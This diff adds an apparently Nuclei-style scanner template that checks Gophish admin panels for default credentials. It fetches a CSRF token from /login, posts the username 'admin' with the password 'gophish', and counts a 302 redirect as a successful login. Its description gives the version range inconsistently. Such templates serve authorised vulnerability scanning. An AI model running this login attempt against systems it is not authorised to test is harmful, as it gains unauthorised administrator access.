@@ -1,0 +1,55 @@
+id: gophish-default-login
+
+info:
+  name: Gophish < v0.10.1 Default Credentials
+  author: arcc,dhiyaneshDK
+  severity: high
+  description: For versions of Gophish > 0.10.1, the temporary administrator credentials are printed in the logs when you first execute the Gophish binary.
+  reference:
+    - https://docs.getgophish.com/user-guide/getting-started
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    max-request: 2
+  tags: gophish,default-login
+
+http:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{user}}&password={{pass}}&csrf_token={{replace(url_encode(html_unescape(csrf_token)), "+", "%2B")}}
+
+    attack: pitchfork
+    payloads:
+      user:
+        - admin
+      pass:
+        - gophish
+    cookie-reuse: true
+
+    extractors:
+      - type: regex
+        name: csrf_token
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - 'name="csrf_token" value="(.+?)"'
+    matchers:
+      - type: dsl
+        dsl:
+          - "!contains(tolower(header), 'location: /login')"
+          - "contains(tolower(header), 'location: /')"
+          - "contains(tolower(header), 'gophish')"
+          - "status_code==302"
+        condition: and
+
+# digest: 4b0a00483046022100b0a3092afa91f9134e5ba820d3156f5a9d302f82a3d1a7ce1f41a94fe7a10dcf022100f0ceb4a5273843ffa4c4a4de320a41c80c8d54a2803c29d19c4e2bd314175196:922c64590222798bb761d5b6d8e72950
